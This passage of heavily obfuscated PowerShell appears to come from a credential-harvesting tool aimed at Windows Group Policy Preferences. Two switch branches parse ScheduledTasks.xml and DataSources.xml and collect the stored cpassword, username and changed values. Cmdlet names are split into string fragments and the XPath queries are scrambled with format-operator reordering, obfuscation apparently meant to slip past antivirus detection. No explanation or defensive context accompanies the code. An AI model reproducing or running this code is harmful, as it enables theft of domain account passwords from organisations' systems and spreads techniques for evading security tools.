                        ${c`PA`SswoRD} += , ${X`Ml} | &('Select-'+'X'+'ml') ("{5}{0}{10}{4}{7}{1}{9}{3}{8}{11}{6}{2}"-f'c','P','ord','pert','T','/S','assw','asks/Task/','i','ro','heduled','es/@cp') | &('Select-'+'Obj'+'e'+'ct') -Expand no`dE | &('Fo'+'rEach-O'+'bj'+'e'+'ct') {${_}."VAl`Ue"}
                        ${Us`ErnA`mE} += , ${x`mL} | &('Sele'+'ct-Xm'+'l') ("{2}{0}{5}{1}{4}{7}{6}{8}{3}"-f'ch','ul','/S','s','e','ed','/Task/Pro','dTasks','perties/@runA') | &('Sel'+'ec'+'t-O'+'bject') -Expand no`dE | &('For'+'Each-Obj'+'ect') {${_}."vAl`UE"}
                        ${cH`A`NGed} += , ${x`mL} | &('S'+'elect-'+'Xml') ("{0}{3}{5}{6}{2}{1}{4}" -f'/','cha','@','Sche','nged','duledTasks/Ta','sk/') | &('Select-'+'Obj'+'e'+'ct') -Expand NO`dE | &('Fo'+'r'+'Each-Ob'+'ject') {${_}."VaL`Ue"}
                    }
        
                    ("{2}{0}{3}{4}{1}"-f 'a','.xml','D','taSource','s') { 
                        ${c`pAssW`o`RD} += , ${x`Ml} | &('Sel'+'ec'+'t'+'-Xml') ("{7}{5}{4}{2}{1}{3}{6}{0}"-f 'word','/','rce/Properties','@','Sources/DataSou','Data','cpass','/') | &('S'+'el'+'ect-O'+'bje'+'ct') -Expand No`DE | &('ForEach-O'+'b'+'je'+'ct') {${_}."v`ALUe"}
                        ${US`Er`NaME} += , ${X`ML} | &('S'+'ele'+'ct-Xm'+'l') ("{3}{6}{5}{2}{7}{1}{8}{4}{0}{10}{9}" -f 'ce/Pro','c','S','/','s/DataSour','ata','D','our','e','ies/@username','pert') | &('Selec'+'t-'+'Obje'+'ct') -Expand nO`De | &('ForE'+'ach'+'-Ob'+'j'+'ect') {${_}."v`AlUE"}
                        ${chAng`ED} += , ${X`Ml} | &('Se'+'le'+'ct-X'+'ml') ("{2}{5}{4}{3}{1}{0}"-f 'hanged','c','/DataSou','e/@','urc','rces/DataSo') | &('Se'+'lect'+'-Ob'+'jec'+'t') -Expand no`dE | &('ForEach-'+'Objec'+'t') {${_}."vAL`UE"}                          
                    }
                    
